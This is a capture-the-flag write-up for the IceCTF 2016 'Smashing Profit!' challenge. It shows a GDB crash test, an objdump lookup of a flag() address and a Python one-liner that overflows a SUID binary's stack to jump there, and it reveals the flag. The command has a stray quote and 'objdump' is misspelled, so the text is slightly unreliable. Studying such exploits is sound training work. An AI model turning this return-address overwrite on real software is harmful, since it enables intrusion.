---
layout: post
title: IceCTF 2016 Smashing Profit! Writeup
---

Smashing Profit!, 60 points, Pwn

For this challenge we need to connect to the shell IceCTF gives us.
So lets first log in and see what we are given.

Once in we browse to /home/profit and do an ls on the dir.

We see there is a Makefile, a SUID binary, and a flag.txt file.

The first thing I do when pwning a binary is throw it in GDB and throw a
pattern at it.

```
(gdb) r
Starting program: /home/profit/profit
Smashing the stack for fun and...?
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUU

Program received signal SIGSEGV, Segmentation fault.
0x54545454 in ?? ()
```
Looking at this info we see it Seg Faults at the letter T.

From here we need to find out what we want to jump too, so lets run

```
objdrump -D profit
```

After running this and going through the output we see a function called flag at the address 0x0804850b.

With all this information we can go ahead and pwn this program.

To do this I decided to run a python command that was as follows
```
python -c "print 'A'*76'+'\x0b\x85\x04\x08'" | ./profit
```
The \x0b\x85\x04\x08 is just the flag address translated into little endian.

After running this you get the output **IceCTF{who_would_have_thunk?}**
